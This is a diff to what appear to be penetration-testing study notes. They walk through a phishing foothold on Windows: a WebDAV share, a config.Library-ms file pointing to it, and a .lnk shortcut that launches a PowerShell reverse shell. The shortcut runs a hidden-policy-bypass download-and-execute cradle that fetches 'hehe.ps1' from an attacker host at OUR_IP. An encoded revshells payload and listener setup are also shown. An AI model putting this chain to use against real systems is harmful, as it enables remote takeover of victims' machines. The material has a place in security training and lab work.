@@ -9,7 +9,7 @@ In the first stage, we'll use Windows library files to gain a foothold on the ta
 First we need to install and setup a WebDAV share. We are using a WebDAV share over something like a simple http server so that it can be rendered in Windows explorer.
 
 ```bash
-wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root $(pwd)
 ```
 
 We will then create the file `config.Library-ms` with the following contents to open the WebDAV share remotely
@@ -29,12 +29,14 @@ We will then create the file `config.Library-ms` with the following contents to 
 <isDefaultSaveLocation>true</isDefaultSaveLocation>
 <isSupported>false</isSupported>
 <simpleLocation>
-<url>http://192.168.1.18</url>
+<url>http://OUR_IP</url>
 </simpleLocation>
 </searchConnectorDescription>
 </searchConnectorDescriptionList>
 </libraryDescription>
 ```
+
+This file will be what we send to the target.
 
 Next we will create a `.lnk` file that will launch our reverse shell. Because `.lnk` files have restricted character lengths, we will use the following command as opposed to the usual base64 encoded payload. We can use the `PowerShell #3 (Base64)` reverse shell from [revshells](https://www.revshells.com/) and place it in the file `hehe.ps1`.
 
@@ -47,10 +49,12 @@ powershell -e JABjAGwAaQBlAG4AdAA...
 `automatic_configuration.lnk` path for target to click (more details can be found [here](../../11%20Windows/Windows%20Shells.md))
 
 ```powershell
-powershell -nop -w hidden -noni -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.18:8000/hehe.ps1')"
+powershell -nop -noni -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://OUR_IP:8000/hehe.ps1')"
 ```
 
-Before sending the `.lnk` we can setup our listeners with the following commands in separate terminals
+We will now place `automatic_configuration.lnk` in the directory where we are serving our wsgidav web server so that the target can run it after opening `config.Library-ms`
+
+Before sending the `config.Library-ms` file, we can setup our listeners with the following commands in separate terminals
 
 ```bash
 python3 -m http.server
